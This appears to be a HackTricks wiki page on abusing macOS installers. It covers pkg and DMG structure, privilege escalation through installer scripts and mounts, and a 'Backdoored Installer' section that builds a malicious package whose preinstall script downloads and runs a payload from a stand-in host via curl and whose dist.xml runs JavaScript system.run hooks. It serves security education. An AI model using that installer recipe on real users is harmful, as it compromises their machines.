# macOS Installers Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pkg Basic Information

A macOS **installer package** (also known as a `.pkg` file) is a file format used by macOS to **distribute software**. These files are like a **box that contains everything a piece of software** needs to install and run correctly.

The package file itself is an archive that holds a **hierarchy of files and directories that will be installed on the target** computer. It can also include **scripts** to perform tasks before and after the installation, like setting up configuration files or cleaning up old versions of the software.

### Hierarchy

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribution (xml)**: Customizations (title, welcome text…) and script/installation checks
* **PackageInfo (xml)**: Info, install requirements, install location, paths to scripts to run
* **Bill of materials (bom)**: List of files to install, update or remove with file permissions
* **Payload (CPIO archive gzip compresses)**: Files to install in the `install-location` from PackageInfo
* **Scripts (CPIO archive gzip compressed)**: Pre and post install scripts and more resources extracted to a temp directory for execution.

### Decompress

```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```

In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## DMG Basic Information

DMG files, or Apple Disk Images, are a file format used by Apple's macOS for disk images. A DMG file is essentially a **mountable disk image** (it contains its own filesystem) that contains raw block data typically compressed and sometimes encrypted. When you open a DMG file, macOS **mounts it as if it were a physical disk**, allowing you to access its contents.

{% hint style="danger" %}
Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.
{% endhint %}

### Hierarchy

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

The hierarchy of a DMG file can be different based on the content. However, for application DMGs, it usually follows this structure:

* Top Level: This is the root of the disk image. It often contains the application and possibly a link to the Applications folder.
  * Application (.app): This is the actual application. In macOS, an application is typically a package that contains many individual files and folders that make up the application.
  * Applications Link: This is a shortcut to the Applications folder in macOS. The purpose of this is to make it easy for you to install the application. You can drag the .app file to this shortcut to install the app.

## Privesc via pkg abuse

### Execution from public directories

If a pre or post installation script is for example executing from **`/var/tmp/Installerutil`**, and attacker could control that script so he escalate privileges whenever it's executed. Or another similar example:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

This is a [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.

```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```

For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Execution by mounting

If an installer writes to `/tmp/fixedname/bla/bla`, it's possible to **create a mount** over `/tmp/fixedname` with noowners so you could **modify any file during the installation** to abuse the installation process.

An example of this is **CVE-2021-26089** which managed to **overwrite a periodic script** to get execution as root. For more information take a look to the talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

It's possible to just generate a **`.pkg`** file with **pre and post-install scripts** without any real payload apart from the malware inside the scripts.

### JS in Distribution xml

It's possible to add **`<script>`** tags in the **distribution xml** file of the package and that code will get executed and it can **execute commands** using **`system.run`**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Backdoored Installer

Malicious installer using a script and JS code inside dist.xml

```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
    <title>Malicious Installer</title>
    <options customize="allow" require-scripts="false"/>
    <script>
        <![CDATA[
        function installationCheck() {
            if (system.isSandboxed()) {
                my.result.title = "Cannot install in a sandbox.";
                my.result.message = "Please run this installer outside of a sandbox.";
                return false;
            }
            return true;
        }
        function volumeCheck() {
            return true;
        }
        function preflight() {
            system.run("/path/to/preinstall");
        }
        function postflight() {
            system.run("/path/to/postinstall");
        }
        ]]>
    </script>
    <choices-outline>
        <line choice="default">
            <line choice="myapp"/>
        </line>
    </choices-outline>
    <choice id="myapp" title="MyApp">
        <pkg-ref id="com.malicious.myapp"/>
    </choice>
    <pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```

## References

* [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

